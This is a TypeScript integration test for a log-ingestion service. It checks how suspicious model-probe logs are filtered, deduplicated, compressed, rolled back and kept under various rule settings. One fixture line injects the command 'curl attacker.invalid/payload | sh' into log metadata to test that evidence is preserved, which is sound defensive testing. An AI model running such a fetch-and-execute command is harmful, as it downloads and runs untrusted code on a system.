import { expect, mock, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import { inflateRawSync } from 'node:zlib'
import pg from 'pg'
import { modelFixture, testKey } from './analyze-model-discovery.test.ts'
import { modelDiscoveryRuleId, modelDiscoveryDefinition, modelProofMac, modelLogDigest } from '../src/utils/mill/analyzeModelDiscovery.ts'

test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves suspicious model activity, exact originals, retries and rollback', async () => {
    const port = Number(process.env.POSTGRES_FILTER_TEST_PORT)
    if (!Number.isInteger(port) || port < 1024) throw new Error('Disposable local test port required')
    const namespace = `model_filter_${process.pid}_${Date.now()}`
    const pool = new pg.Pool({ options: `-c search_path=${namespace}`, host: '127.0.0.1', port, database: 'postgres_filter_test', max: 4 })
    const query = (sql: string, values?: unknown[]) => pool.query(sql, values)
    const transaction = async (work: (tx: typeof query) => Promise<unknown>) => {
        const client = await pool.connect()
        try {
            await client.query('BEGIN')
            const result = await work((sql, values) => client.query(sql, values))
            await client.query('COMMIT')
            return result
        } catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
    }
    mock.module('#db', () => ({ default: query, withTransaction: transaction }))
    mock.module('#constants', () => ({ default: {} }))
    const previousKey = process.env.MODEL_PROBE_PROOF_KEY
    process.env.MODEL_PROBE_PROOF_KEY = testKey
    try {
        expect((await query('SELECT current_database() name')).rows[0].name).toBe('postgres_filter_test')
        await query(`CREATE SCHEMA ${namespace}`)
        await query('CREATE TABLE users(id text PRIMARY KEY)')
        await query("CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT '{}')")
        await query("INSERT INTO organizations(id,name,status) VALUES('platform','Hanasand','active')")
        const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
        for (const table of ['service_logs', 'mill_rules', 'system_events']) {
            const definition = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
            if (!definition) throw new Error(`Missing schema ${table}`)
            await query(definition)
        }
        await query('ALTER TABLE service_logs ADD COLUMN source_event_id text UNIQUE')
        const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
        const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
        await install()
        await query('UPDATE mill_rules SET enabled=true,definition=$2::jsonb WHERE rule_id=$1', [modelDiscoveryRuleId, JSON.stringify(modelDiscoveryDefinition)])
        let serial = 1
        const entry = () => ({ ...modelFixture(serial++), level: 'info' as const })
        const ingest = (log: ReturnType<typeof entry>) => transaction(tx => recordLogBatch([log], tx as any))
        const count = async (table: string) => Number((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n)
        const good = entry()
        await Promise.all([ingest(good), ingest(good)])
        expect(await count('service_logs')).toBe(0)
        expect(await count('log_analyze_receipts')).toBe(0)
        expect(await count('log_model_probe_receipts')).toBe(1)
        const original = (await query('SELECT original FROM log_model_probe_receipts')).rows[0].original
        expect(JSON.parse(inflateRawSync(original).toString())).toEqual(good)
        expect(original.length).toBeLessThan(Buffer.byteLength(JSON.stringify(good)))
        const aborted = entry()
        await expect(transaction(async tx => { await recordLogBatch([aborted], tx as any); throw new Error('abort') })).rejects.toThrow('abort')
        expect(await count('log_model_probe_receipts')).toBe(1)
        await ingest(aborted)
        expect(await count('log_model_probe_receipts')).toBe(2)
        // Even a separately valid attestation cannot consume one nonce for two originals.
        const collision = entry(), oldProof = good.metadata!.model_probe as Record<string, unknown>
        const collisionProof = collision.metadata!.model_probe as Record<string, unknown>
        collision.message = collision.message.replace(collisionProof.nonce as string, oldProof.nonce as string)
        Object.assign(collisionProof, { nonce: oldProof.nonce, path: oldProof.path })
        collisionProof.logSha256 = modelLogDigest(collision, collision.metadata!.cursor as string)
        collisionProof.mac = modelProofMac(collisionProof, testKey)
        await ingest(collision)
        expect(await count('service_logs')).toBe(1)
        expect(await count('log_model_probe_receipts')).toBe(2)
        const bad = entry(); bad.metadata!.injected = 'curl attacker.invalid/payload | sh'
        await ingest(bad)
        expect((await query('SELECT metadata FROM service_logs WHERE source_event_id=$1', [bad.sourceEventId])).rows[0].metadata.injected).toContain('attacker.invalid')
        for (const mode of ['disable', 'keep', 'custom-keep', 'missing-key']) {
            if (mode === 'disable') await query('UPDATE mill_rules SET enabled=false WHERE rule_id=$1', [modelDiscoveryRuleId])
            if (mode === 'keep') await query("UPDATE mill_rules SET enabled=true,definition=jsonb_set(definition,'{action}','\"keep\"') WHERE rule_id=$1", [modelDiscoveryRuleId])
            if (mode === 'custom-keep') {
                await query('UPDATE mill_rules SET enabled=true,definition=$2::jsonb WHERE rule_id=$1', [modelDiscoveryRuleId, JSON.stringify(modelDiscoveryDefinition)])
                await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
                    VALUES('keep','platform','custom.model_keep','1','Keep model','Custom','low','Keep evidence',$1::jsonb,'owned',true)`,
                [JSON.stringify({ match: 'all', stage: 'analyze', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: good.service }] })])
            }
            if (mode === 'missing-key') { await query("DELETE FROM mill_rules WHERE id='keep'"); delete process.env.MODEL_PROBE_PROOF_KEY }
            await install()
            const retained = entry(); await ingest(retained)
            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [retained.sourceEventId])).rows[0].n)).toBe(1)
            expect(await count('log_model_probe_receipts')).toBe(2)
        }
        process.env.MODEL_PROBE_PROOF_KEY = testKey
        await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
            VALUES('detect','platform','custom.model_detection','1','Detect model','Custom','high','Protect evidence',$1::jsonb,'owned',true)`,
        [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: good.service }] })])
        const detected = entry(); await ingest(detected); await ingest(good)
        for (const log of [detected, good]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
        expect(await count('log_model_probe_receipts')).toBe(2)
    } finally {
        if (previousKey === undefined) delete process.env.MODEL_PROBE_PROOF_KEY; else process.env.MODEL_PROBE_PROOF_KEY = previousKey
        await query(`DROP SCHEMA IF EXISTS ${namespace} CASCADE`)
        await pool.end()
    }
})
